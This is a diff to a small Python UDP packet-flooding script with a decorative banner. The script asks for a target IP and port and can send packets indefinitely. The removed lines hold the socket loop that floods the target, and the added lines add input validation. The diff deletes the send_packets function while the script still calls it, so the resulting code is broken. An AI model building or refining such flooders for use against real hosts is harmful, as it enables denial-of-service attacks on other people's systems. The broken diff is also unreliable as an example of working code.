@@ -1,29 +1,44 @@
 import socket
 import time
+import ipaddress
+
+def is_valid_ip(ip):
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        return False
 
 def print_sign():
     sign = '''
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⢹⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢀⣾⣿⠃⠀⠀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⢹⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣾⣿⠃⠀⠀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣰⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣦⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
-⠀⠀⠀⠀⠀⢰⣿⡇⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
-⠀⠀⠀⠀⠀⣾⣿⣧⡀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
+⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
+⠀⠀⠀⠀⠀⢰⣿⡇⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
+⠀⠀⠀⠀⠀⣾⣿⣧⡀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
 ⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠉⠀⠀⠀
-    '''
+'''
     print(sign.center(80, ' '))
 
 def print_made_by():
-    print("\033[93mMade by itsalex0712\033[0m".center(80, ' '))
+    print("\033[93mMade by itsalex0712\033[0m")
+
+def get_int_input(prompt):
+    while True:
+        try:
+            return int(input(prompt))
+        except ValueError:
+            print("Invalid input. Please enter a valid integer.")
 
 # Print the sign in purple color
 print("\033[95m")
@@ -33,42 +48,24 @@ print("\033[0m")
 # Print the made by message in gold color
 print_made_by()
 
-print()  # Add an empty line
+# Get user input for the target IP address and validate it
+while True:
+    ip_address = input("Enter the target IP address: ")
+    if is_valid_ip(ip_address):
+        break
+    else:
+        print("Invalid IP address. Please enter a valid IP address.")
 
-def send_packets(ip_address, port, num_packets, packet_size, delay):
-    try:
-        target_address = (ip_address, port)
-        data = b'x' * packet_size if packet_size > 0 else b'x'  # Customize the data to be sent (in this case, it's 'x')
-        
-        if packet_size == 0:
-            print("Sending packets infinitely. To stop, press Ctrl+C.")
-        
-        packet_num = 1
-        while packet_size == 0 or packet_num <= num_packets:
-            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                try:
-                    s.sendto(data, target_address)
-                    print(f"\033[92mPacket {packet_num}/{num_packets} sent successfully.\033[0m")
-                    if packet_size == 0:
-                        time.sleep(delay)  # Introduce a delay in seconds
-                    else:
-                        packet_num += 1
-                        time.sleep(delay)  # Introduce a delay in seconds
-                except Exception as e:
-                    print(f"\033[91mPacket {packet_num}/{num_packets} sending failed: {e}\033[0m")
-                    if packet_size == 0:
-                        time.sleep(delay)  # Introduce a delay in seconds
-                    else:
-                        packet_num += 1
-                        time.sleep(delay)  # Introduce a delay in seconds
-    except Exception as e:
-        print(f"Error occurred: {e}")
+# Get user input for the target port number and validate it
+port = get_int_input("Enter the target port number: ")
 
-# Get user input for customization
-ip_address = input("Enter the target IP address: ")
-port = int(input("Enter the target port number: "))
-num_packets = int(input("Enter the number of packets to send (0 for infinite): "))
-packet_size = int(input("Enter the size of each packet in bytes (0 for infinite): "))
+# Get user input for the number of packets to send and validate it
+num_packets = get_int_input("Enter the number of packets to send (0 for infinite): ")
+
+# Get user input for the size of each packet and validate it
+packet_size = get_int_input("Enter the size of each packet in bytes (0 for infinite): ")
+
+# Get user input for the delay between each packet and validate it
 delay = float(input("Enter the delay between each packet (in seconds): "))
 
 send_packets(ip_address, port, num_packets, packet_size, delay)
